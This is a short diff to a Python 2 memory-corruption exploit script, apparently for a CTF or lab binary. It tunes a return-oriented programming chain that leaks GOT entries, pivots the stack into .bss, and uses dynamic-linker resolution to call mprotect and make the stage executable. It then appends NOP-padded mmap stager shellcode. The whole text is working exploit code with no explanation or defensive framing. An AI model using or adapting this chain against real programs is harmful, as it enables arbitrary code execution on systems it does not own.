@@ -10,7 +10,7 @@ addr_stage = rop.section('.bss') + 0x800
 buf = rop.fill(offset)
 buf += rop.call_chain_plt(
     ['write', 1, rop.got()+8, 8],
-    ['read', 0, addr_stage, 400]
+    ['read', 0, addr_stage, 600]
 )
 buf += rop.pivot(addr_stage)
 
@@ -25,10 +25,8 @@ buf += rop.call_chain_ptr(
     [rop.got('read'), 0, addr_dt_debug, 8],
     [addr_stage, addr_stage & ~0xFFF, 0x1000, 7]
 )
-buf += rop.dl_resolve(addr_stage + len(buf), 'mprotect', retaddr=addr_stage+297)
-print "[+] offset to string: %d" % len(buf)
-buf += sc.get('mmap_stager')
-buf += rop.fill(400, buf)
+buf += rop.dl_resolve(addr_stage + len(buf), 'mprotect', retaddr=addr_stage+400)
+buf += sc.nopfill('mmap_stager', 600, buf)
 
 p.write(buf)
 p.write_p64(0)
